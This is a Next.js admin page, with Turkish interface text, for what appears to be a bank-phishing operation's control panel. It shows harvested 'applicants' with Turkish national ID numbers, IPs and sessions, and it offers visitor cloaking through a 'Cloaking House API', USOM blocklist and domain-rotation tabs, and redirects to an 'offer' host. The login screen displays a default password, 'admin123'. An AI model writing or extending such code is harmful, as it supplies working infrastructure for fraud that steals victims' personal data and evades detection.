"use client";

import { useCallback, useEffect, useState } from "react";
import type {
  AccessLogEntry,
  ApplicantWithAttempts,
  BanEntry,
  BanType,
} from "@/lib/storage/types";
import { CrmAccordion } from "@/components/crm/CrmAccordion";
import { CrmAccessLogs } from "@/components/crm/CrmAccessLogs";
import { CrmBans } from "@/components/crm/CrmBans";
import { CrmUsomPanel } from "@/components/crm/CrmUsomPanel";
import { CrmSpaceshipDomains } from "@/components/crm/CrmSpaceshipDomains";

type Tab = "applicants" | "logs" | "bans" | "usom" | "spaceship" | "cloaker" | "redirect";

async function crmFetch<T>(
  path: string,
  authToken: string,
  init?: RequestInit
): Promise<{ ok: true; data: T } | { ok: false; reason: "auth" | "server"; message?: string }> {
  const res = await fetch(path, {
    ...init,
    headers: {
      ...init?.headers,
      Authorization: `Bearer ${authToken.trim()}`,
      ...(init?.body ? { "Content-Type": "application/json" } : {}),
    },
  });

  if (res.status === 401) {
    return { ok: false, reason: "auth" };
  }

  if (!res.ok) {
    const body = await res.json().catch(() => ({}));
    return {
      ok: false,
      reason: "server",
      message: (body as { error?: string }).error ?? "Sunucu hatası",
    };
  }

  const data = (await res.json()) as T;
  return { ok: true, data };
}

export default function CrmPage() {
  const [password, setPassword] = useState("");
  const [token, setToken] = useState<string | null>(null);
  const [tab, setTab] = useState<Tab>("applicants");
  const [applicants, setApplicants] = useState<ApplicantWithAttempts[]>([]);
  const [logs, setLogs] = useState<AccessLogEntry[]>([]);
  const [bans, setBans] = useState<BanEntry[]>([]);
  const [loading, setLoading] = useState(false);
  const [error, setError] = useState("");
  const [settings, setSettings] = useState<{
    cloakEnabled: boolean;
    redirectEnabled: boolean;
    offerHost: string;
  }>({ cloakEnabled: true, redirectEnabled: true, offerHost: "" });

  const handleAuthError = useCallback(() => {
    sessionStorage.removeItem("crm_token");
    setToken(null);
    setApplicants([]);
    setLogs([]);
    setBans([]);
    setError("Şifre hatalı veya oturum süresi doldu. Tekrar giriş yapın.");
  }, []);

  const loadApplicants = useCallback(
    async (authToken: string) => {
      const result = await crmFetch<ApplicantWithAttempts[]>(
        "/api/crm/applicants",
        authToken
      );
      if (!result.ok) {
        if (result.reason === "auth") handleAuthError();
        else setError(result.message ?? "Veri yüklenemedi");
        return false;
      }
      setApplicants(result.data);
      return true;
    },
    [handleAuthError]
  );

  const loadLogs = useCallback(
    async (authToken: string) => {
      const result = await crmFetch<AccessLogEntry[]>(
        "/api/crm/access-logs",
        authToken
      );
      if (!result.ok) {
        if (result.reason === "auth") handleAuthError();
        else setError(result.message ?? "Loglar yüklenemedi");
        return false;
      }
      setLogs(result.data);
      return true;
    },
    [handleAuthError]
  );

  const loadBans = useCallback(
    async (authToken: string) => {
      const result = await crmFetch<BanEntry[]>("/api/crm/bans", authToken);
      if (!result.ok) {
        if (result.reason === "auth") handleAuthError();
        else setError(result.message ?? "Ban listesi yüklenemedi");
        return false;
      }
      setBans(result.data);
      return true;
    },
    [handleAuthError]
  );

  const loadAll = useCallback(
    async (authToken: string) => {
      setLoading(true);
      setError("");
      try {
        const promises: Promise<unknown>[] = [
          loadApplicants(authToken),
          loadBans(authToken),
        ];
        if (authToken.endsWith("-super")) {
          promises.push(loadLogs(authToken));
        }
        await Promise.all(promises);
      } catch {
        setError(
          "Sunucuya bağlanılamadı. Uygulamanın çalıştığından emin olun (npm run dev)."
        );
      } finally {
        setLoading(false);
      }
    },
    [loadApplicants, loadLogs, loadBans]
  );

  const loadSettings = useCallback(
    async (authToken: string) => {
      const result = await crmFetch<{
        cloakEnabled: boolean;
        redirectEnabled: boolean;
        offerHost: string;
      }>("/api/crm/settings", authToken);
      if (result.ok && result.data) {
        setSettings({
          cloakEnabled: result.data.cloakEnabled,
          redirectEnabled: result.data.redirectEnabled,
          offerHost: result.data.offerHost || "",
        });
      }
    },
    []
  );

  const toggleSetting = async (key: "cloakEnabled" | "redirectEnabled") => {
    if (!token) return;
    const newVal = !settings[key];
    const result = await crmFetch<{ cloakEnabled: boolean; redirectEnabled: boolean }>(
      "/api/crm/settings",
      token,
      {
        method: "PATCH",
        body: JSON.stringify({ [key]: newVal }),
      }
    );
    if (result.ok && result.data) {
      setSettings((prev) => ({
        ...prev,
        cloakEnabled: result.data.cloakEnabled,
        redirectEnabled: result.data.redirectEnabled,
      }));
    } else if (!result.ok) {
      setError(result.message ?? "Ayar güncellenemedi");
    }
  };

  useEffect(() => {
    const saved = sessionStorage.getItem("crm_token");
    if (saved) {
      setToken(saved);
      loadAll(saved);
      loadSettings(saved);
    }
  }, [loadAll, loadSettings]);

  const login = async () => {
    if (!password.trim()) {
      setError("Şifre giriniz");
      return;
    }

    setLoading(true);
    setError("");
    try {
      const result = await crmFetch<ApplicantWithAttempts[]>(
        "/api/crm/applicants",
        password.trim()
      );

      if (!result.ok) {
        if (result.reason === "auth") {
          setError("Şifre hatalı. Varsayılan şifre: admin123");
          return;
        }
        setError(result.message ?? "Giriş yapılamadı");
        return;
      }

      sessionStorage.setItem("crm_token", password);
      setToken(password);
      setApplicants(result.data);
      const promises: Promise<unknown>[] = [loadBans(password)];
      if (password.endsWith("-super")) promises.push(loadLogs(password));
      await Promise.all(promises);
    } catch {
      setError(
        "Sunucuya bağlanılamadı. Uygulamanın çalıştığından emin olun (npm run dev)."
      );
    } finally {
      setLoading(false);
    }
  };

  const logout = () => {
    sessionStorage.removeItem("crm_token");
    setToken(null);
    setApplicants([]);
    setLogs([]);
    setBans([]);
    setError("");
  };

  const addBan = async (type: BanType, value: string, reason?: string) => {
    if (!token) return;
    const result = await crmFetch<BanEntry>("/api/crm/bans", token, {
      method: "POST",
      body: JSON.stringify({ type, value, reason }),
    });
    if (!result.ok) {
      setError(result.message ?? "Ban eklenemedi");
      return;
    }
    await loadBans(token);
  };

  const removeBan = async (id: string) => {
    if (!token) return;
    const result = await crmFetch<{ removed: boolean }>(
      `/api/crm/bans?id=${encodeURIComponent(id)}`,
      token,
      { method: "DELETE" }
    );
    if (!result.ok) {
      setError(result.message ?? "Ban kaldırılamadı");
      return;
    }
    await loadBans(token);
  };

  const banWithConfirm = async (
    type: BanType,
    value: string,
    label: string
  ) => {
    if (!window.confirm(`${label} yasaklansın mı?\n${value}`)) return;
    await addBan(type, value, `CRM: ${label}`);
  };

  if (!token) {
    return (
      <div className="flex min-h-screen items-center justify-center bg-gray-100 p-4">
        <div className="w-full max-w-sm rounded-lg bg-white p-6 shadow">
          <h1 className="mb-4 text-xl font-bold text-gray-800">CRM Giriş</h1>
          {error && (
            <p className="mb-3 rounded bg-red-50 px-3 py-2 text-sm text-red-700">
              {error}
            </p>
          )}
          <input
            type="password"
            className="mb-3 w-full rounded border px-3 py-2"
            placeholder="Şifre (varsayılan: admin123)"
            value={password}
            onChange={(e) => setPassword(e.target.value)}
            onKeyDown={(e) => e.key === "Enter" && login()}
          />
          <button
            type="button"
            onClick={login}
            disabled={loading}
            className="w-full rounded bg-ykb-primary py-2 text-white disabled:opacity-60"
          >
            {loading ? "Giriş yapılıyor..." : "Giriş"}
          </button>
        </div>
      </div>
    );
  }

  const isSuper = token?.endsWith("-super") ?? false;

  const tabs: { id: Tab; label: string }[] = [
    { id: "applicants", label: "Başvurular" },
    { id: "bans", label: "Yasaklılar" },
    { id: "usom", label: "USOM / Domain" },
  ];
  if (isSuper) {
    tabs.splice(1, 0, { id: "logs", label: "Erişim Logları" });
    tabs.push({ id: "spaceship", label: "🌐 Spaceship Domainler" });
    tabs.push({ id: "cloaker", label: "🔒 Cloaker" });
    tabs.push({ id: "redirect", label: "🔗 Redirect" });
  }

  return (
    <div className="min-h-screen bg-gray-100 p-4 md:p-6">
      <div className="mx-auto max-w-5xl">
        <div className="mb-6 flex flex-col gap-3 sm:flex-row sm:items-center sm:justify-between">
          <h1 className="text-xl font-bold text-gray-800 md:text-2xl">CRM</h1>
          <div className="flex gap-2">
            <button
              type="button"
              onClick={() => token && loadAll(token)}
              className="rounded border px-3 py-1.5 text-sm"
            >
              Yenile
            </button>
            <button
              type="button"
              onClick={logout}
              className="rounded bg-gray-600 px-3 py-1.5 text-sm text-white"
            >
              Çıkış
            </button>
          </div>
        </div>

        <div className="mb-4 flex flex-wrap gap-2">
          {tabs.map((t) => (
            <button
              key={t.id}
              type="button"
              onClick={() => setTab(t.id)}
              className={`rounded px-3 py-1.5 text-sm ${
                tab === t.id
                  ? "bg-ykb-primary text-white"
                  : "border bg-white text-gray-700"
              }`}
            >
              {t.label}
            </button>
          ))}
        </div>

        {loading && <p className="mb-4 text-gray-500">Yükleniyor...</p>}
        {error && <p className="mb-4 text-red-600">{error}</p>}

        {tab === "applicants" && (
          <CrmAccordion
            applicants={applicants}
            onBanIp={(ip) => banWithConfirm("ip", ip, "IP")}
            onBanSession={(sessionId) =>
              banWithConfirm("session", sessionId, "Oturum")
            }
            onBanTc={(tc) => banWithConfirm("tc", tc, "TC Kimlik")}
          />
        )}

        {tab === "logs" && (
          <CrmAccessLogs
            logs={logs}
            onBanIp={(ip) => banWithConfirm("ip", ip, "IP")}
            onBanSession={(sessionId) =>
              banWithConfirm("session", sessionId, "Oturum")
            }
          />
        )}

        {tab === "bans" && (
          <CrmBans bans={bans} onAddBan={addBan} onRemoveBan={removeBan} />
        )}

        {tab === "usom" && token && (
          <CrmUsomPanel
            authToken={token}
            crmFetch={crmFetch}
            onError={setError}
            isSuper={isSuper}
          />
        )}

        {tab === "spaceship" && token && isSuper && (
          <CrmSpaceshipDomains authToken={token} />
        )}

        {tab === "cloaker" && token && isSuper && (
          <div className="rounded-lg bg-white p-6 shadow">
            <h3 className="mb-4 text-lg font-semibold text-gray-800">Cloaker Kontrolü</h3>
            <div className="mb-4 flex items-center gap-4">
              <div className={`rounded-full px-4 py-2 text-sm font-medium ${
                settings.cloakEnabled
                  ? "bg-green-100 text-green-800"
                  : "bg-red-100 text-red-800"
              }`}>
                {settings.cloakEnabled ? "✅ Aktif" : "⛔ Devre Dışı"}
              </div>
              <button
                type="button"
                onClick={() => toggleSetting("cloakEnabled")}
                disabled={loading}
                className={`rounded px-4 py-2 text-sm font-medium text-white disabled:opacity-60 ${
                  settings.cloakEnabled
                    ? "bg-red-600 hover:bg-red-700"
                    : "bg-green-600 hover:bg-green-700"
                }`}
              >
                {settings.cloakEnabled ? "Cloaker'ı Kapat" : "Cloaker'ı Aç"}
              </button>
            </div>
            <p className="text-sm text-gray-500">
              {settings.cloakEnabled
                ? "Cloaker aktif — ziyaretçiler Cloaking House API üzerinden filtreleniyor."
                : "Cloaker devre dışı — tüm ziyaretçiler direkt başvuru formunu görür."}
            </p>
          </div>
        )}

        {tab === "redirect" && token && isSuper && (
          <div className="rounded-lg bg-white p-6 shadow">
            <h3 className="mb-4 text-lg font-semibold text-gray-800">Redirect Kontrolü</h3>
            <div className="mb-4 flex items-center gap-4">
              <div className={`rounded-full px-4 py-2 text-sm font-medium ${
                settings.redirectEnabled
                  ? "bg-green-100 text-green-800"
                  : "bg-yellow-100 text-yellow-800"
              }`}>
                {settings.redirectEnabled ? "✅ Aktif" : "⏸️ Devre Dışı"}
              </div>
              <button
                type="button"
                onClick={() => toggleSetting("redirectEnabled")}
                disabled={loading}
                className={`rounded px-4 py-2 text-sm font-medium text-white disabled:opacity-60 ${
                  settings.redirectEnabled
                    ? "bg-yellow-600 hover:bg-yellow-700"
                    : "bg-blue-600 hover:bg-blue-700"
                }`}
              >
                {settings.redirectEnabled ? "Redirect'i Kapat" : "Redirect'i Aç"}
              </button>
            </div>
            <p className="text-sm text-gray-500">
              {settings.redirectEnabled
                ? `Redirect aktif — offer kararı verilen ziyaretçiler <strong>${settings.offerHost}</strong> adresine yönlendirilir.`
                : "Redirect devre dışı — offer kararı verilen ziyaretçiler aynı domainde formu görür."}
            </p>
            <p className="mt-2 text-xs text-gray-400">
              Not: Reklam domaini ile offer domaini aynı ise redirect otomatik devre dışı bırakılır.
            </p>
          </div>
        )}
      </div>
    </div>
  );
}
